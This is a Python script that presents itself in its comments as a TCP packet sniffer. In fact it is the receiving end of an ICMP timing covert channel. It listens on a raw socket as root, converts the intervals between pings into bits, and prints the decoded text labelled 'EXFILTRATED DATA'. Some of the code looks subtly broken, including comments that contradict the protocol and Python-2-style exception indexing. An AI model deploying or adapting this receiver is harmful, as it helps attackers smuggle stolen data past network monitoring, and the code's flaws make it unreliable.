# Packet sniffer in python for Linux
# Sniffs only incoming TCP packet
import signal
import socket
import sys
from datetime import datetime as dTime
from os import getuid
from struct import *

communications = dict()

def clear_data(s_addr):
    if s_addr == "":
        communications.clear()
    else:
        if s_addr in communications and len(communications[s_addr]) > 0:
            print("clear data for: " + s_addr)
            communications[s_addr].clear()

def callculate_offsets(s_addr):
    lastTime = None
    first = True
    binary = list()

    # Get timeoffsets
    print("Calculating offsets for: " + s_addr)
    if s_addr in communications:
        value = communications[s_addr]
        for date in value:
            if first:
                lastTime = date
                first = False
            else:
                binary.append((lastTime - date).total_seconds())
                lastTime = date

    # Remove every other entry
    on = False
    num = 0
    raw = ""
    ascii = ""
    for entry in binary:
        if not on:
            on = True
        else:
            if num == 7:
                raw += " " + str(round(abs(entry)))
                on = False
                num = 1
            else:
                raw += str(round(abs(entry)))
                on = False
                num = num + 1

    for word in raw.split(" "):
        ascii += chr(int(word[:8], 2)) + " "

    print("EXFILTRATED DATA: " + ascii)

    #print(raw)
    clear_data(str(s_addr))

def signal_handler(signal, frame):
    clear_data("")
    sys.exit(0)

#######################################################

signal.signal(signal.SIGINT, signal_handler)

# Before we even start make sure we are running as root
if getuid() != 0:
    print("\nPlease run as root... Exiting\n")
    sys.exit(-1)

# create an INET, STREAMing socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
except socket.error as msg:
    print(
    'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
    sys.exit()

# receive a packet
while True:
    packet = s.recvfrom(65565)

    # packet string from tuple
    packet = packet[0]

    # take first 20 characters for the ip header
    ip_header = packet[0:20]

    # now unpack them :)
    iph = unpack('!BBHHHBBH4s4s', ip_header)

    version_ihl = iph[0]
    version = version_ihl >> 4
    ihl = version_ihl & 0xF

    iph_length = ihl * 4

    ttl = iph[5]
    protocol = iph[6]
    s_addr = socket.inet_ntoa(iph[8])
    d_addr = socket.inet_ntoa(iph[9])

    ###### process received packet ###################################################

    last = now = dTime.now()
    print('Packet received from: ' + str(s_addr) + " at: " + str(now))

    if str(s_addr) in communications and len(communications[str(s_addr)]) > 0:
        last = communications[str(s_addr)][-1]

    if (now - last).total_seconds() > 10:
        clear_data(str(s_addr))

    if int((now - last).total_seconds()) > 4 and int((now - last).total_seconds()) < 6:
        print('FIN packet noticed for: ' + str(s_addr))
        callculate_offsets(str(s_addr))
    else:
        if str(s_addr) in communications:
            communications[str(s_addr)].append(now)
        else:
            communications[str(s_addr)] = [now]

    #print(communications)
